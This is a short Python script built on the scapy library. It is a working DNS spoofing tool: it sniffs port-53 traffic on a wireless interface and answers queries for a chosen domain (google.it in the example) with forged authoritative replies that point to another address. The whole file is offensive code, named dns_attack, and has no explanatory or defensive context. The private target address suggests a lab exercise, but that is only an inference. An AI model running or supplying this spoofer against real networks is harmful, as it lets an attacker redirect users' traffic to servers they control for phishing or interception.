from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, UDP

def dns_response(packet, interface, victim_webserver, redirected_webserver):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # Check if it's a DNS query
        # Extract the DNS query details
        dns_query = packet.getlayer(DNS)
        dns_id = dns_query.id
        dns_qname = dns_query.qd.qname
        dns_qtype = dns_query.qd.qtype
        dns_qclass = dns_query.qd.qclass

        print("got DNS packet")
        
        if victim_webserver in dns_qname.decode():
            # Create DNS response packet
            dns_response = DNS(
                id=dns_id,
                qr=1,  # QR flag: Response
                aa=1,  # AA flag: Authoritative Answer
                qdcount=1,  # Number of questions
                ancount=1,  # Number of answers
                nscount=0,  # Number of authoritative name servers
                arcount=0,  # Number of additional records
                qd=DNSQR(qname=dns_qname, qtype=dns_qtype, qclass=dns_qclass),  # DNS question section
                an=DNSRR(rrname=dns_qname, type=dns_qtype, rclass=dns_qclass, ttl=3600, rdata=redirected_webserver),  # DNS answer section
            )
            
            # Create IP packet
            ip_packet = IP(dst=packet[IP].src, src=packet[IP].dst)
            
            # Create UDP packet
            udp_packet = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
            
            # Construct the final packet
            response_packet = ip_packet / udp_packet / dns_response
            
            # Send the response packet
            send(response_packet, verbose=0, iface=interface)
            print("Sent forged packet")
        else:
            print("Not important")

def dns_attack(interface, victim_webserver, redirected_webserver):
    bpf_filter = 'udp and port 53'

    sniff(filter = bpf_filter, prn = lambda pkt: dns_response(pkt, interface, victim_webserver, redirected_webserver), iface = interface)

if __name__ == '__main__':
    dns_attack("wlp0s20f3", "google.it", "10.20.30.4")